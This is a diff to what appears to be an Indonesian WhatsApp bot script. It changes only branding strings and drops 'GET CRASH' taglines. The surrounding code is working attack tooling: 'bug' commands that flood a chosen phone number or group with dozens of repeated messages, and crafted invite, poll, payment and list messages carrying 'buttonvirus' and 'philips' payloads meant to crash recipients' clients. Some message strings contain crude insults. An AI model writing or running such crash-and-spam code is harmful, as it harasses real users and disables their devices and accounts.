@@ -638,8 +638,8 @@ var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "groupInviteMessage": {
 "groupJid": "85296556573-1328272333@g.us",
 "inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": `MY NAME HIRO MODZ GET CRASH 😈 ${ngazap(prefix)}`,
-"groupName": `MY NAME HIRO MODZ GET CRASH 😈 ${ngazap(prefix)}`,
+"inviteExpiration": `MY NAME HIRO MODZ ${ngazap(prefix)}`,
+"groupName": `MY NAME HIRO MODZ ${ngazap(prefix)}`,
 "caption": `${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
@@ -704,7 +704,7 @@ if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "BUG POLLING HIRO MODZ GET CRASH 😈",
+"name": "BUG POLLING HIRO MODZ",
 "options": [
 	{
 "optionName": "KATANYA WA KEBAL"
@@ -780,14 +780,14 @@ if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|a
 num = q.split('|')[0]
 jumlah = q.split('|')[1]
 for (let i = 0; i < jumlah; i++) {
-m.reply(`Oke HIRO >.<`)
+m.reply(`Oke Hiro Modz >.<`)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER HIRO MODZ GET CRASH 😈`,
+"text": `MY DEVELOPER HIRO MODZ`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -809,7 +809,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER HIRO MODZ GET CRASH 😈`,
+"text": `MY DEVELOPER HIRO MODZ`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -824,25 +824,25 @@ if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 a = await haikal.sendMessage(m.chat, {react: { text: "🇮🇩", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
 }
 reply(`Succes`)
@@ -872,15 +872,15 @@ if (isBan) throw sticBanLu(from)
 if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
 a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "HIRO MODZ GET CRASH"}, {quoted: doc})
 await sleep(10000)
 }
 reply(`Succes`)
@@ -892,7 +892,7 @@ if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-deploy(`${m.pushName} HELLO SAYA HIRO MODZ GET CRASH 😈 ${text ? ': ' + text : ''}`)
+deploy(`${m.pushName} Hello Saya Hiro Modz ${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
@@ -901,7 +901,7 @@ if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `HALLO AKU HIRO MODZ GET CRASH 😈`
+ydd = `Hallo Aku Hiro Modz`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {sticker: thumb},{quoted: {
 key: { 
@@ -934,7 +934,7 @@ if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `HALLO AKU HIRO MODZ GET CRASH 😈`
+ydd = `Hallo Aku Hiro Modz`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {requestPaymentMessage: thumb},{quoted: {
 key: { 
@@ -946,7 +946,7 @@ participant: `0@s.whatsapp.net`,
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER HIRO MODZ GET CRASH 😈`,
+"text": `MY DEVELOPER HIRO MODZ`,
 }
 }
 }})
@@ -960,7 +960,7 @@ if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `HALLO AKU HIRO MODZ GET CRASH 😈`
+ydd = `Hallo Aku Hiro Modz`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {document: thumb},{quoted: {
 key: {
@@ -990,7 +990,7 @@ case 'bugbctext': {
 if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 if (isBan) throw sticBanLu(from)
 
-if (!text) throw `*Type some text*\n\nExample : ${prefix + command} HIRO MODZ GET CRASH 😈`
+if (!text) throw `*Type some text*\n\nExample : ${prefix + command} HIRO MODZ`
 let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${haikal.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
 let anu = await store.chats.all().map(v => v.id)
 m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
@@ -3891,7 +3891,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ ownermenu
 └❒ bugmenu
 
-© Hiro Modz Modz
+© Hiro Modz
 `,
 }
 }}}), { userJid: m.chat, quoted: m })
@@ -3907,7 +3907,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
 "title": ` © Hola ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
-"description": ` - © Hiro Modz Modz -
+"description": ` - © Hiro Modz -
 
 ┌❑ *INFORMATION* ❑
 ├❒ Owner : ${botname}
@@ -3924,7 +3924,7 @@ SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIH LANJUT ✌️`,
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© Hiro Modz Modz`,
+"retailerId": `© Hiro Modz`,
 "url": "wa.me/6283149877456"
 },  
 "businessOwnerJid": "6283149877456@s.whatsapp.net",
@@ -4840,7 +4840,7 @@ for (let i = 0; i < jumlah; i++) {
 ]
 
 const buttonMessage = {
-    text: "BUG BY HIRO MODZ GET CRASH 😈",
+    text: "BUG BY HIRO MODZ",
     footerText: 'Pe',
     buttons: buttons,
     headerType: 1
@@ -4924,14 +4924,14 @@ if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 
 touchmebre = [
 {
-title: `🌷 HIRO MODZ GET CRASH 😈 🌷 ${buttonvirus} ${buttonvirus}`,
+title: `🌷 HIRO MODZ 🌷 ${buttonvirus} ${buttonvirus}`,
 rows: [
 {title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
 {title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
 ]
 }
 ]
-haikal.sendListMsg(m.chat, `🌷 HIRO MODZ GET CRASH 😈 🌷`, haikal.user.name, `HAY KAK SC BOT ADA DI LIST`, `CLICK HERE 🌷`, touchmebre, m)
+haikal.sendListMsg(m.chat, `🌷 HIRO MODZ 🌷`, haikal.user.name, `HAY KAK SC BOT ADA DI LIST`, `CLICK HERE 🌷`, touchmebre, m)
 break
 case 'bugbuttonv2':{
 if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
@@ -5074,7 +5074,7 @@ pc = generateWAMessageFromContent(m.chat,{
 "invitetime": "9999999999999999",
 "groupName": `© Hiro Modz ${philips}️️`,
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`),//FIXED © Hiro Modz MD
-"caption": `BUG INVITE HIRO MODZ GET CRASH 😈\n\n${philips}`,
+"caption": `BUG INVITE HIRO MODZ\n\n${philips}`,
 "contextInfo": {
 "forwardingScore": 150,
 "isForwarded": true
@@ -5242,47 +5242,47 @@ break
 case 'colidek' : {
 if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
                     a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
-                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
+                    await haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"}, {quoted: doc})
                     m.reply(`BUG COLI DEK`)
                     }
                     break
 case 'kitchekamir' : { 
 if (!text) throw `Nomernya?`
                     a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"}, {quoted: a})
                     m.reply(`Succes`)
                     }
 	break
@@ -5348,21 +5348,21 @@ jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
 } 
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fdoc})
 await m.reply(`Succes`)
 }
 break
@@ -5383,21 +5383,21 @@ message: {
 } 
 } 
 }
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foto})
 await m.reply(`Succes`)
 break
 case 'sendbug3':
@@ -5417,21 +5417,21 @@ message: {
 }
 } 
 }
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fvoc})
